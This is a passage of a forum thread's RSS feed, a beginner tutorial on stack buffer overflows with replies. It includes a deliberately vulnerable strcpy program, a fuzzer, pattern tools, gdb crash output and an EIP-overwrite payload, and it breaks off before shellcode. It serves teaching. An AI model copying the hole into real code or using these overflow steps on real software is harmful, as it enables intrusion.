[Phrack 49 - Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) 

[My 20% - Smashing the Stack in 2011](https://paulmakowski.wordpress.com/2011/01/25/smashing-the-stack-in-2011/)

[Whiskey Tango Foxtrot - Smashing the Stack for Fun &amp; Profit : Revived](https://avicoder.me/2016/02/01/smashsatck-revived/)

[Corelan Team - Exploit writing tutorial part 1 : Stack Based Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

[ch3rn0byl - Intro to Buffer Overflows](http://ch3rn0byl.com/intro-to-buffer-overflows/)

[The Grey Corner - Stack Based Windows Buffer Overflow Tutorial](http://www.thegreycorner.com/2010/01/beginning-stack-based-buffer-overflow.html)

Hope the content of this post helps you to bridge the gap too!</description>
    
    <lastBuildDate>Sun, 04 Feb 2018 19:09:49 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Getting cozy with exploit development</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/5">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/5</link>
        <pubDate>Tue, 06 Mar 2018 16:32:00 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-5311-5</guid>
        <source url="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311.rss">Getting cozy with exploit development</source>
      </item>
      <item>
        <title>Getting cozy with exploit development</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>Hey there, I haven’t had the chance to thoroughly read this yet, but would you please replace those video screenshots with functioning links? You can even set the start time of the video with a parameter like: <code>?t=1m56s</code>.</p>
          <p><a href="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/4">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/4</link>
        <pubDate>Sun, 04 Feb 2018 19:09:49 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-5311-4</guid>
        <source url="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311.rss">Getting cozy with exploit development</source>
      </item>
      <item>
        <title>Getting cozy with exploit development</title>
        <dc:creator><![CDATA[dostoevsky]]></dc:creator>
        <description><![CDATA[
            <p>True! Also if you are using windbg and immunity in the future with mona.py you can use</p>
<pre><code class="lang-auto">pc 256
</code></pre>
<p>To generate and</p>
<pre><code class="lang-auto">po 0xd34db33f
</code></pre>
<p>to find the offset.</p>
          <p><a href="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/3">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/3</link>
        <pubDate>Sun, 04 Feb 2018 18:39:32 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-5311-3</guid>
        <source url="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311.rss">Getting cozy with exploit development</source>
      </item>
      <item>
        <title>Getting cozy with exploit development</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="dostoevsky" data-post="1" data-topic="5311">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/dostoevsky/48/4090_2.png" class="avatar"> dostoevsky:</div>
<blockquote>
<p>Alright, let’s get started by creating a pattern of 256-bytes using the metasploit-framework’s pattern_create.</p>
</blockquote>
</aside>
<p>Small addition to that:<br>
If you don’t have the metasploit framework installed but are using either <a href="https://github.com/Gallopsled/pwntools">pwntools</a> or a gdb enhancement like <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> you can use either to create cyclic patterns as well:</p>
<p>Using <strong>pwntools:</strong></p>
<pre><code class="lang-auto">&gt;&gt;&gt; from pwn import *
&gt;&gt;&gt; print cyclic(256)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac
&gt;&gt;&gt; 
</code></pre>
<p>Using: <strong>pwndbg</strong>:</p>
<pre><code class="lang-auto">$ gdb -q
Loaded 108 commands. Type pwndbg [filter] for a list.
pwndbg&gt; cyclic 256
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac
pwndbg&gt; 
</code></pre>
<hr>
<p>Besides that quite a nice introduction to the whole topic <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> !</p>
          <p><a href="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/2">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/2</link>
        <pubDate>Sun, 04 Feb 2018 18:35:35 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-5311-2</guid>
        <source url="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311.rss">Getting cozy with exploit development</source>
      </item>
      <item>
        <title>Getting cozy with exploit development</title>
        <dc:creator><![CDATA[dostoevsky]]></dc:creator>
        <description><![CDATA[
            <h4><a name="p-21029-community-assigned-level-1" class="anchor" href="https://d.clarkee.co.uk#p-21029-community-assigned-level-1"></a>Community Assigned Level:</h4>
<p><a href="https://d.clarkee.co.uk/t/getting-cozy-with-exploit-development/5311/1">Click to view the poll.</a></p>
<p>There won’t be anything groundbreaking in here, and a lot of the content will be sourced from others (properly attributed, mind you).</p>
<p>However, I am going to try to bring a different perspective to the table to bridge the gap I faced <em>somewhere</em> in-between where my understanding stopped and the write-ups picked up. This is the path I’ve taken learning the basics of exploit development.</p>
<p>There may be technical inaccuracies as this is my own understanding after 6-months of playing around in memory and doing CTF challenges. Please send any corrections my way.</p>
<p>I’ll be breaking this post up into the following sections:</p>
<ul>
<li><a href="https://d.clarkee.co.uk#your-journey-begins">Your Journey Begins</a></li>
<li><a href="https://d.clarkee.co.uk#processors-and-weird-machines">Processors and Weird Machines</a></li>
<li><a href="https://d.clarkee.co.uk#tools-of-the-trade">Tools of the trade</a></li>
<li><a href="https://d.clarkee.co.uk#setting-up-your-environment">Setting up your environment</a></li>
<li><a href="https://d.clarkee.co.uk#the-instruction-pointer">The Instruction Pointer</a></li>
<li><a href="https://d.clarkee.co.uk#fuzzing">Fuzzing</a></li>
<li><a href="https://d.clarkee.co.uk#observing-a-crash">Observing a crash</a></li>
<li><a href="https://d.clarkee.co.uk#dancing-around-in-memory">Dancing around in memory</a></li>
<li><a href="https://d.clarkee.co.uk#putting-it-all-together">Putting it all together</a></li>
<li><a href="https://d.clarkee.co.uk#practice-makes-slightly-better">Practice makes slightly better</a></li>
</ul>
<p><a name="your-journey-begins"></a></p>
<h2><a name="p-21029-your-journey-begins-2" class="anchor" href="https://d.clarkee.co.uk#p-21029-your-journey-begins-2"></a>Your Journey Begins</h2>
<p>We’ll start with the basics, these are things you should read before you begin your journey. Don’t worry if you don’t grasp the entirety of the knowledge shared by these authors, but try to look at the graphs and read the posts and <em>start</em> thinking about it. Having a small foundation to build on will help you out greatly when it comes time to get lost sifting through memory.</p>
<p>First, a basic understanding of assembly is necessary to be able to make sense of what we’re going to be doing. Let’s watch a crash course on x86 assembly by <a href="https://hackucf.org/blog/" rel="noopener nofollow ugc">HackUCF</a></p><p><a href="https://www.youtube.com/watch?v=75gBFiFtAb8">x86 Assembly Crash Course</a></p>

<h3><a name="p-21029-further-reading-3" class="anchor" href="https://d.clarkee.co.uk#p-21029-further-reading-3"></a>Further Reading</h3>
<p><a href="https://www.amazon.com/Buffer-Overflow-Attacks-Exploit-Prevent/dp/1932266674?tag=0x00sec03-20" rel="noopener nofollow ugc">Buffer Overflow Attacks: Detect, Exploit, Prevent</a><br>
This is probably the greatest book for beginners on the subject I’ve ever read. It not only gives you unique perspectives on how the exploits work but also is full of history and examples.</p>
<p><a href="https://wiki.skullsecurity.org/index.php?title=Fundamentals" rel="noopener nofollow ugc">SkullSecurity - Assembly Language Tutorial</a><br>
This is probably one of the greatest and least terrifying introductions to assembly I have ever read. It’s what got me on track to beginning to understand the building blocks of computer systems. Reading through each section a few times, will leave you feeling a lot more confident in what you’re about to embark on.</p>
<p><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/" rel="noopener nofollow ugc">Many But Finite - Anatomy of a Program in Memory</a><br>
This post is great as a first deep look into how memory works. I find that in order to successfully build exploits we almost have to undergo a perceptual switch in which we can really think in the context of a program running in memory.</p>
<p><a href="https://manybutfinite.com/post/journey-to-the-stack/" rel="noopener nofollow ugc">Many But Finite - Journey to the Stack</a><br>
Of course, when it comes to exploit development there is a lot of work to be done in the stack, this post is that deep dive into how the stack actually works. You really need to get an understanding of how a stack frame is built if you want to build fake stack frames.</p>
<p><a href="https://manybutfinite.com/post/epilogues-canaries-buffer-overflows/" rel="noopener nofollow ugc">Many But Finite - Epilogues, Canaries, and Buffer Overflows</a><br>
This is a great post for detailing how a buffer overflow occurs and begins to touch on the idea of security mechanisms we may encounter on our journeys.</p>
<p><a name="processors-and-weird-machines"></a></p>
<h2><a name="p-21029-processors-and-weird-machines-4" class="anchor" href="https://d.clarkee.co.uk#p-21029-processors-and-weird-machines-4"></a>Processors and Weird Machines</h2>
<p><a href="http://langsec.org/papers/Bratus.pdf" rel="noopener nofollow ugc">From Buffer Overflows to “Weird Machines” and Theory of Computation</a><br>
This really helped me bridge that gap of understanding what we were doing when we exploited a buffer overflow. We are literally creating weird machines out of systems, allowing us to build our own systems within systems. In some cases you can even achieve Turing completeness through these weird machines.</p>
<p><a href="https://docs.google.com/presentation/d/1lfQGEX2aGEA1H7flsXw4V30ZkbnrfikYk9IrctuwZO8" rel="noopener nofollow ugc">Weird Machines, Exploitability, and provable non-exploitability</a><br>
I recently stumbled upon this slideshow by <a href="https://twitter.com/halvarflake" rel="noopener nofollow ugc">Thomas Dullien</a> which discusses this very concept. The key takeaway from these slides for me was that it’s easy to teach someone how to overwrite the instruction pointer and jump to a bit of attacker controlled memory. However, what does that <em>really</em> teach someone? Can they apply it in a slightly, or perhaps wildly, different scenario? Probably not.</p>
<p>He defines weird machines <em>really</em> well. As the exploit developer, you are exploring what you can do with these weird machines. Much like programming, you have to be able to troubleshoot and debug your code and you have to be able to visualize your exploit in memory to properly understand what you are doing.</p>
<h4><a name="p-21029-breaking-the-x86-instruction-set-5" class="anchor" href="https://d.clarkee.co.uk#p-21029-breaking-the-x86-instruction-set-5"></a>Breaking the x86 Instruction Set</h4>
<p><a href="https://www.youtube.com/watch?v=KrksBdWcZgQ">Breaking the x86 Instruction Set</a></p>

<p>This video does a great job of explaining why there is a fundamental problem with the processor and why we cannot solve the problem with software alone. You don’t have to watch the whole thing now, however, I would recommend coming back to it when you’ve gained a bit of a better understanding.</p>
<p>The key takeaway here is that cpu’s inherently trust everything you tell them to do, and with a trust-model like this it’s no wonder that achieving malicious code execution is so trivial. Software intends to define a logic set that implements memory protections to stop such attacks. However, at the end of the day all it takes is one mistake in an incredibly complex system to make it past those protections and for the cpu to happily run your code. That’s its job, after all.</p>
<p><a name="tools-of-the-trade"></a></p>
<h2><a name="p-21029-tools-of-the-trade-6" class="anchor" href="https://d.clarkee.co.uk#p-21029-tools-of-the-trade-6"></a>Tools of the trade</h2>
<p>Before we go on, let’s talk about some tools that you’ll likely want to have at your disposal. There are loads of different tools out there for assisting in reverse engineering and exploit development, I’d recommend you explore them all.</p>
<p>This video by <a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w" rel="noopener nofollow ugc">LiveOverflow</a> goes over a lot of different command line tools as well as feature rich debuggers such as file, strings, ltrace, strace, objdump, hopper, and radare2. Consider this a primer.</p>
<p><a href="https://www.youtube.com/watch?v=3NTXFUxcKPc">Simple Tools and Techniques for Reversing a binary - bin 0x06</a></p>

<p>Below are some quick cheatsheets on using some of the tools I find to be the most useful in building exploits.</p>
<h3><a name="p-21029-immunity-debugger-7" class="anchor" href="https://d.clarkee.co.uk#p-21029-immunity-debugger-7"></a>Immunity Debugger</h3>
<pre><code class="lang-auto">Breakpoint: F2
Step: F7
Exec till Return: Ctrl+F9
Run: F9
Pause: F12
</code></pre>
<h3><a name="p-21029-monapy-8" class="anchor" href="https://d.clarkee.co.uk#p-21029-monapy-8"></a>mona.py</h3>
<pre><code class="lang-auto">config [option] [value] - set configuration
pc [size] - generate cyclic pattern
po [address] - find offset
findmsp - find register overwritten with pattern
bytearray -b [badchars] - generate bytes from 0x00 to 0xff excluding badchars
jmp -r [register] - find a jump point
-n - skip modules that start with 0x00
-o - skip os modules
-m - module
-cm - module property
-cpd - filter bad chars
</code></pre>
<h3><a name="p-21029-windbg-9" class="anchor" href="https://d.clarkee.co.uk#p-21029-windbg-9"></a>WinDBG</h3>
<pre><code class="lang-auto"># Shortcuts
Open Executable: CTRL+E
Attach to process: F6
Memory: Alt+5
Close Window: Ctrl+F4
Restart: Ctrl+Shift+F5
Break: Ctrl+Break

# Commands
g - pass exception
gN - step
bp [address] - breakpoint
bl - list breakpoints
!exchain - view exception chain
.load pykd.pyd - load python
!py mona [command] [args] - exceute mona stuff
a -&gt; [jmp address]
u [address] - inspect
u - view stack
t - step
</code></pre>
<h3><a name="p-21029-gdb-10" class="anchor" href="https://d.clarkee.co.uk#p-21029-gdb-10"></a>gdb</h3>
<pre><code class="lang-auto">disas - disassemble
b - breakpoint
c - continue
r - run
p - print address
st - step
x - examine
  x/s - examine string
  x/n - examine n entries
i r - info registers
i proc m - info proc map
define hook - build a hook to call under conditions
vm - virtual memory
si - step instruction (follow jumps)
ni - next instruction
</code></pre>
<h3><a name="p-21029-other-tools-11" class="anchor" href="https://d.clarkee.co.uk#p-21029-other-tools-11"></a>Other Tools</h3>
<p>There are other <em>very</em> useful tools, you can google them.</p>
<p>IDA Pro<br>
gdb-peda<br>
pwntools<br>
x64dbg<br>
ollydbg</p>
<p><a name="setting-up-your-environment"></a></p>
<h2><a name="p-21029-setting-up-your-environment-12" class="anchor" href="https://d.clarkee.co.uk#p-21029-setting-up-your-environment-12"></a>Setting up your environment</h2>
<p>When you run gdb it does a few things to setup its environment that will make it slightly different from your terminal’s environment. This will cause issues dealing with memory addresses because environmental variables wind up in the memory space of our running program.</p>
<p>In order to cause the least amount of headaches try adding these commands to your <code>.gdbinit</code> file.</p>
<pre data-code-wrap="bash"><code class="lang-bash">bash -c "echo 'unset env LINES' &gt;&gt; .gdbinit"
bash -c "echo 'unset env COLUMNS' &gt;&gt; .gdbinit"
</code></pre>
<p>This will align your memory in gdb with your normal shell. Otherwise the return address you use to jump to your shellcode won’t be the same in gdb as it is in your terminal. This will stop your shell from running outside of gdb.</p>
<p>Lastly, we’ll disable <code>ASLR</code>. Also check to make sure it’s been disabled (0 = disabled).</p>
<pre data-code-wrap="bash"><code class="lang-bash">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
0
</code></pre>
<p>Alright with that out of the way we can get started!</p>
<p><a name="the-instruction-pointer"></a></p>
<h2><a name="p-21029-the-instruction-pointer-13" class="anchor" href="https://d.clarkee.co.uk#p-21029-the-instruction-pointer-13"></a>The Instruction Pointer</h2>
<p>The instruction pointer as you probably know by now is the most important pointer for developing a basic stack-based exploit. Luckily these days gaining control of this pointer isn’t enough to gain code execution, but it’s still very important to understand <em>how</em> to gain control of pointers before you can move onto more complex topics.</p>
<p>Generally, the concept is very simple, you find out how to supply data to the input you suspect is vulnerable. Throw data at it until you observe a crash. You can then use the metasploit-framework to build out a unique pattern and then analyze the overwritten Instruction Pointer to determine the exact offset to overwrite it.</p>
<p>Here is a great video for first visualizing a buffer overflow:</p>
<p><a href="https://www.youtube.com/watch?v=1S0aBV-Waeo">Running a Buffer Overflow Attack - Computerphile</a></p>

<p>It’s the first video I watched and I honestly still go back to it from time to time. I find as I gain more knowledge in this area, my understanding of simple concepts grows dramatically. For example, the way I visualized a stack 6 months ago versus the way I visualize it now are worlds apart.</p>
<p><a name="fuzzing"></a></p>
<h2><a name="p-21029-fuzzing-14" class="anchor" href="https://d.clarkee.co.uk#p-21029-fuzzing-14"></a>Fuzzing</h2>
<p>There are plenty of ways to fuzz an application for a crash, in addition to this there are a lot of different ways a user can interact with the input of an application. You have to think about this in order to understand how to build a fuzzing tool. For example, if you are supplying data from stdin, your fuzzer will operate slightly differently than if you’re sending the data in an http get request to a webserver.</p>
<p>There is also great tooling for Fuzzing applications you should explore, however for the purposes of this post we will be taking a manual approach. If you’re interested in Fuzzing tools check out <a href="https://github.com/OpenRCE/sulley" rel="noopener nofollow ugc">Sulley</a>.</p>
<p>Since we are going to keep it simple for the sake of this post, consider the following vulnerable program, which takes user input as a command line argument.</p>
<pre><code class="lang-auto">#include &lt;string.h&gt;
int main(int argc, char *argv[])
{
    char buff[256];
    strcpy(buff, argv[1]);
    return 0;
}
</code></pre>
<p>Compiled with</p>
<pre><code class="lang-auto">gcc -o test test.c -m32 -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
</code></pre>
<p>In order to fuzz certain parts of a binary you may have to reverse engineer the steps required to get to the specific input to fuzz before you can automate throwing your fuzz data at it. However, in this instance we are <em>trying</em> to keep it simple. So let’s just jump in and build our fuzzer:</p>
<pre><code class="lang-auto">#!/usr/bin/python
import subprocess, sys
# How many bytes do we wanna set as our maximum
MAX_BYTES = 300
# How many bytes to increment each attempt by
SEED_BYTES = 1
# Default buffer
BUFFER = "A"
while len(BUFFER) &lt;= MAX_BYTES:
    command = ["./test {}".format(BUFFER)]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    print "[x] Throwing {} bytes...".format(len(BUFFER))
    if process.stderr.read() == "Segmentation fault\n":
        # Segfault was reached, we crashed at len(BUFFER)
        print "[!] Crashed with {} bytes.".format(len(BUFFER))
        sys.exit()
    # Increment our Bufffer by SEED_BYTES
    BUFFER += "A" * SEED_BYTES
</code></pre>
<p><a name="observing-a-crash"></a></p>
<h2><a name="p-21029-observing-a-crash-15" class="anchor" href="https://d.clarkee.co.uk#p-21029-observing-a-crash-15"></a>Observing a crash</h2>
<p>In some instances, you may want to open gdb or whatever debugger you are using and observe the crash by opening the executable before fuzzing or attaching to an already running process. For this example, we’re just going to run our fuzzer first.</p>
<p>Fuzz the input with our python script</p>
<pre><code class="lang-auto">➜  python test.py
[x] Throwing 1 bytes...
[x] Throwing 2 bytes...
--skip a few---
[!] Crashed with 256 bytes.
</code></pre>
<p>Great so we know the program crashes at <code>256-bytes</code>, which makes sense because we were creating a buffer of <code>256-bytes</code> in the C program, and then using <code>strcpy</code> to copy <code>argv[1]</code> into that buffer. It crashes when it runs into a situation where it has nothing to do.</p>
<p>For example, if you overwrite the Instruction Pointer with A’s or <code>0x41414141</code>, it will crash when it tries to jump to that address because there is no <code>0x41414141</code> in memory. Knowing this, we can create an exploit that works within the <code>256-bytes</code> that we have control over, if we exceed that we will overwrite some arbitrary memory and cause a crash.</p>
<p>We may also cause a crash by writing less than <code>256-bytes</code>. For example, if we find an offset to overwrite <code>EIP</code>, but don’t pad the right side to equal a total of <code>256-bytes</code> It’s possible that <code>EIP</code> won’t be overwritten with the value we think because <code>EIP</code> itself is an offset. That padding will allow us to align our <code>EIP</code> so that it is read as we intend it. Remember earlier when we talked about exploring as an exploit developer? This is part of that process.</p>
<p><a name="dancing-around-in-memory"></a></p>
<h2><a name="p-21029-dancing-around-in-memory-16" class="anchor" href="https://d.clarkee.co.uk#p-21029-dancing-around-in-memory-16"></a>Dancing around in memory</h2>
<p>Before we focus on controling <code>EIP</code>, lets run through our assembly. There is a great tool we can use to get comfortable with it at <a href="https://godbolt.org/" rel="noopener nofollow ugc">godbolt</a>.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/b/b917498f05e67b2d7ea8622f6cf6f64a278a1af8.png" data-download-href="/uploads/short-url/qpodWC9go87Jc2THgKMT6B8RORy.png?dl=1" title="Getting cozy with exploit development - godbolt" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b917498f05e67b2d7ea8622f6cf6f64a278a1af8.png" alt="Getting cozy with exploit development - godbolt" width="690" height="193"></a></div><p></p>
<p>Explore it, get used to looking at it, we’re going to be spending a lot of time disassembling functions.</p>
<p>Alright, let’s get started by creating a pattern of <code>256-bytes</code> using the metasploit-framework’s <code>pattern_create</code>.</p>
<pre data-code-wrap="bash"><code class="lang-bash">➜  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 256       
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
</code></pre>
<p>Using this pattern let’s observe the crash in gdb. First open the program with gdb, then we run the program with our pattern.</p>
<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
Starting program: /home/dostoevsky/example/test Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A

Program received signal SIGSEGV, Segmentation fault.
</code></pre>
<p>Notice we hit our Segmentation fault, here is what our registers look like, you’ll see that part of our pattern flows into <code>ESP</code> and <code>ECX</code> points to <code>ESP</code>, and that our <code>EIP</code> gets overwritten as <code>Ad6A</code> or <code>0x41366441</code></p>
<pre data-code-wrap="bash"><code class="lang-bash">[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd000 ("d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
EDX: 0xffffd08e --&gt; 0xd0004134 
ESI: 0xf7f9a000 --&gt; 0x1cfd70 
EDI: 0x0 
EBP: 0x0 
ESP: 0xffffd000 ("d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
EIP: 0x41366441 ('Ad6A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
</code></pre>
<p>A full look at our stack</p>
<pre data-code-wrap="bash"><code class="lang-bash">[------------------------------------stack-------------------------------------]
0000| 0xffffd000 ("d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
0004| 0xffffd004 ("8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
0008| 0xffffd008 ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
0012| 0xffffd00c ("e1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
0016| 0xffffd010 ("2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
0020| 0xffffd014 ("Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
0024| 0xffffd018 ("e5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
0028| 0xffffd01c ("6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A")
</code></pre>
<p>This is because we threw a pattern that filled up our buffer at our vulnerable program. You can determine the exact offset to overwrite <code>EIP</code> using metasploit-framework’s <code>pattern_offset</code></p>
<pre><code class="lang-auto">➜  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41366441
[*] Exact match at offset 108
</code></pre>
<p>Okay, so now we should be able to gain control of <code>EIP</code> with <code>108-bytes</code>, the next <code>4-bytes</code> will overwrite <code>EIP</code>, and the remaining <code>144-bytes</code> after that should be padded to fill up our buffer (causing our program to crash). Our exploit will be in the order of <code>[108-bytes][EIP][Padding]</code>.</p>
<p>Our padding is easy to calculate. We just take our <code>crash point - offset - EIP == 144</code> and then multiply them by our padding character, in this case, we’ll use “C” or <code>0x43434343</code>. Here’s a visualization of what our exploit order will look like</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/67e6030225d75b0192e20cabfbf2751963724c92.png" alt="Getting cozy with exploit development" width="" height=""></p>
<p>Let’s give it a try!</p>
<pre><code class="lang-auto">gdb-peda$ r `python -c "print 'A' * 108 + 'BBBB' + 'C' * (256 - 108 - 4)"`
Starting program: /home/dostoevsky/example/test `python -c "print 'A' * 108 + 'BBBB' + 'C' * (256 - 108 - 4)"`

Program received signal SIGSEGV, Segmentation fault.
</code></pre>
<p>And as you can see we hit our Segmentation fault and our <code>EIP</code> is overwritten with <code>0x42424242</code> or <code>BBBB</code>, which is what we wanted. You also notice that <code>ESP</code> gets overwritten with our 144 C’s. This is because we padded the right side of our exploit to fill up the full <code>256-bytes</code> with <code>"C" * ( 256 - 108 - 4)</code> which equals 144.</p>
<pre><code class="lang-auto">Program received signal SIGSEGV, Segmentation fault
